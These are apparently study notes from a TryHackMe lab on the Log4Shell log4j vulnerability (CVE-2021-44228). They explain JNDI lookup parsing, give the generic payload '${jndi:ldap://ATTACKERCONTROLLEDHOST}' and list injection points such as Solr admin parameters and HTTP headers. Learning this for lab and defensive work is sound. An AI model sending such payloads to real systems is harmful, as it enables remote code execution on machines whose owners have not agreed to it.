# Log4j Notes

Reference: Notes taken from [Solar, exploiting log4j](https://tryhackme.com/room/solar)

On December 9th, 2021, the world was made aware of a new vulnerability identified as CVE-2021-44228, affecting the Java logging package log4j. This vulnerability earned a severity score of 10.0 (the most critical designation) and offers remote code trivial remote code execution on hosts engaging with software that utilizes this log4j version. This attack has been dubbed "Log4Shell"

For a growing community-supported list of software and services vulnerable to CVE-2021-44228, check out this GitHub repository:

- [Log4jAttackSurface](https://github.com/YfryTchsGD/Log4jAttackSurface)

The log4j package adds extra logic to logs by "parsing" entries, ultimately to enrich the data -- but may additionally take actions and even evaluate code based off the entry data. This is the gist of CVE-2021-44228. Other syntax might be in fact executed just as it is entered into log files.

Some examples of this syntax are:

    ${sys:os.name}
    ${sys:user.name}
    ${log4j:configParentLocation}
    ${ENV:PATH}
    ${ENV:HOSTNAME}  
    ${java:version}

You may already know the general payload to abuse this log4j vulnerability. The format of the usual syntax that takes advantage of this looks like so:

    ${jndi:ldap://ATTACKERCONTROLLEDHOST}

This syntax indicates that the log4j will invoke functionality from "JNDI", or the "Java Naming and Directory Interface." Ultimately, this can be used to access external resources, or "references," which is what is weaponized in this attack.

Notice the ldap:// schema. This indicates that the target will reach out to an endpoint (an attacker controlled location, in the case of this attack) via the LDAP protocol.

The next question is, where could we enter this syntax?: ***Anywhere that has data logged by the application.***

Unfortunately, it is very hard to determine where the attack surface is for different applications, and ergo, what applications are in fact vulnerable. Simply seeing the presence of log4j files doesn't clue in on the exact version number, or even where or how the application might use the package.

Consider the example in the TryHackMe Solar room, we already discovered that you could supply params to the /solr/admin/cores URL. We should understand that this is where you supply our inject syntax.  We can simply supply HTTP GET variables or parameters which will then processed and parsed by log4j. All it takes is this single line of text -- and that makes this vulnerability extremely easy to exploit.

Other locations you might supply this JNDI syntax:

- Input boxes, user and password login forms, data entry points within applications
- HTTP headers such as User-Agent, X-Forwarded-For, or other customizable headers
- **Any place for user-supplied data**

[More information on this JNDI attack vector, please review this Black Hat USA presentation from 2016](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)

